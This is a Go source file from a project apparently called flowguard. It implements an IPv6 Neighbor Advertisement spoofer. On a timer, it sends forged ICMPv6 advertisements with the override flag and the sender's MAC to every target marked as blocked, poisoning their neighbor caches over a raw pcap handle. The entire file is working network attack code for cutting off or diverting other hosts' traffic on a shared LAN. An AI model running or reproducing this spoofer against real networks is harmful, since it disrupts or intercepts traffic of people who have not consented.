package core

import (
	"net"
	"time"

	"github.com/bugkey24/flowguard/internal/models"
	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

type Spoofer6 struct {
	Handle   *pcap.Handle
	MyMAC    net.HardwareAddr
	MyIPv6   net.IP 
	Session  *models.SessionManager
	StopChan chan struct{}
}

func NewSpoofer6(handle *pcap.Handle, myMAC net.HardwareAddr, session *models.SessionManager) *Spoofer6 {
	myIPv6 := getLocalIPv6()
	
	return &Spoofer6{
		Handle:   handle,
		MyMAC:    myMAC,
		MyIPv6:   myIPv6,
		Session:  session,
		StopChan: make(chan struct{}),
	}
}

func (s *Spoofer6) Start() {
	if s.MyIPv6 == nil { return }

	ticker := time.NewTicker(2 * time.Second)
	
	go func() {
		defer ticker.Stop()
		for {
			select {
			case <-s.StopChan:
				return
			case <-ticker.C:
				s.attackRoutine()
			}
		}
	}()
}

func (s *Spoofer6) attackRoutine() {
	targets := s.Session.GetAllTargets()
	for _, t := range targets {
		if len(t.IPv6) > 0 && t.IsBlocked {
			go s.sendNeighborAdvertisement(t.IPv6, t.MAC)
		}
	}
}

func (s *Spoofer6) sendNeighborAdvertisement(targetIPv6 net.IP, targetMAC net.HardwareAddr) {
	if s.Handle == nil { return }

	// 1. Ethernet Header
	eth := layers.Ethernet{
		SrcMAC:       s.MyMAC,
		DstMAC:       targetMAC,
		EthernetType: layers.EthernetTypeIPv6,
	}

	// 2. IPv6 Header
	ip6 := layers.IPv6{
		Version:      6,
		TrafficClass: 0,
		FlowLabel:    0,
		Length:       32,
		NextHeader:   layers.IPProtocolICMPv6,
		HopLimit:     255, 
		SrcIP:        s.MyIPv6, 
		DstIP:        targetIPv6,
	}

	// 3. ICMPv6 Header
	icmp6 := layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
	}
	
	na := layers.ICMPv6NeighborAdvertisement{
		Flags:         0x20, // Override Flag
		TargetAddress: targetIPv6,
	}

	opt := layers.ICMPv6Option{
		Type: 2,
		Data: []byte(s.MyMAC),
	}
	
	na.Options = append(na.Options, opt)

	// Checksum Setup
	icmp6.SetNetworkLayerForChecksum(&ip6)

	// Serialize
	buf := gopacket.NewSerializeBuffer()
	opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
	
	err := gopacket.SerializeLayers(buf, opts, &eth, &ip6, &icmp6, &na)
	if err != nil { return }

	_ = s.Handle.WritePacketData(buf.Bytes())
}

func (s *Spoofer6) Stop() {
	close(s.StopChan)
}

func getLocalIPv6() net.IP {
	ifaces, _ := net.Interfaces()
	for _, i := range ifaces {
		if i.Flags&net.FlagUp == 0 || i.Flags&net.FlagLoopback != 0 { continue }
		addrs, _ := i.Addrs()
		for _, addr := range addrs {
			var ip net.IP
			switch v := addr.(type) {
			case *net.IPNet: ip = v.IP
			case *net.IPAddr: ip = v.IP
			}
			if ip.To4() == nil && ip.IsLinkLocalUnicast() {
				return ip
			}
		}
	}
	return nil
}